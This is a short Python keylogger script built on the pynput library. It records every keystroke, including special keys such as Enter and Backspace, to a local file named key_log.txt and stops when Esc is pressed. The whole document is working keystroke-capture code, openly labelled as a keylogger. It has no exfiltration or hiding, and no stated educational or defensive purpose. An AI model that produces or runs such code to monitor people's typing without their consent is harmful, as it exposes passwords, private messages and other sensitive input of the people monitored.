from pynput import keyboard

# Path to save the log file
LOG_FILE = "key_log.txt"

# Function to log the keys to a file
def write_to_file(key):
    with open(LOG_FILE, "a") as log_file:
        try:
            # Write key to file
            log_file.write(key.char)
        except AttributeError:
            # Handle special keys (e.g., space, enter, backspace)
            if key == keyboard.Key.space:
                log_file.write(" ")
            elif key == keyboard.Key.enter:
                log_file.write("\n")
            elif key == keyboard.Key.backspace:
                log_file.write("[BACKSPACE]")
            else:
                log_file.write(f"[{key.name}]")

# Listener for key events
def on_press(key):
    write_to_file(key)

def on_release(key):
    # Stop keylogger if escape key is pressed
    if key == keyboard.Key.esc:
        return False

# Main function to start the keylogger
def start_keylogger():
    print("Keylogger started. Press 'Esc' to stop.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
